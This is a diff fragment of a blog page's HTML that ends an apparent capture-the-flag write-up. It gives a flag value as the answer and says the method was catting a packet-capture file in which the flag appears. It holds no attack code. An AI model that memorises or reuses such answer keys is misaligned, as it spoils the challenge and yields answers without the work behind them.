+<strong>Answer</strong>: f9b43c9e9c05be5e08ea163007af5144 –<br />
+<strong>Method</strong>: Catted the networking.pcap.process file and it was littered with the flag.</p>
+
+  
+  
+
+
+    </article>
+  
 
     <nav role="navigation" id="pagination">
+  <span class="next">
+    <a href="/blog/page/2/" rel="next">Continue &rarr;</a>
+  </span>
+
 
 </nav>
   </section>
